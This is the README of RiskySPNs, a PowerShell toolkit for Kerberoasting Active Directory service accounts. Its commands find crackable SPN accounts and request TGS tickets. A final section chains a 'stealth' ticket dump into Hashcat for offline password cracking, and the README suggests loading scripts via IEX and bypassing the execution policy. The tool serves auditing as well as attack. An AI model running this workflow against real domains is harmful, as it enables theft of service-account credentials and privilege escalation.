# RiskySPNs
RiskySPNs is a collection of PowerShell tools focused on detecting and abusing accounts associated with SPNs (Service Principal Name). This module can assist blue teams to identify potentially risky SPNs as well as red teams to escalate privileges by leveraging Kerberos and Active Directory.

## Usage
##### Install the module
```powershell
Import-Module .\RiskySPNs.psm1
```
Or just load the script (you can also `IEX` from web):
```powershell
. .\Get-PotentiallyCrackableAccounts.ps1
```
Make sure `Set-ExecutionPolicy` is `Unrestricted` or `Bypass`
##### Get information about a function
```powershell
Get-Help Get-TGSCipher -Full
```
All fucntions also have `-Verbose` mode

#### Search vulnerable SPNs
**Find vulnerable accounts:**
```powershell
Get-PotentiallyCrackableAccounts
```
Sensitive + RC4 = $$$

**Generate full deatiled report about vulnerable accounts (CISO <3)**
```powershell
Report-PotentiallyCrackableAccounts
```
#### Get tickets
**Request Kerberos TGS for SPN**
```powershell
Get-TGSCipher -SPN "MSSQLSvc/prodDB.company.com:1433"
```

Or:
```powershell
Get-PotentiallyCrackableAccounts -GetSPNs | Get-TGSCipher
```
#### The fun stuff :)

```powershell
Get-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -DoNotQuery -ConvertTo "Hashcat" -SaveTo c:\crack.txt" 
oclHashcat64.exe -m 13100 crack.txt -a 3
```



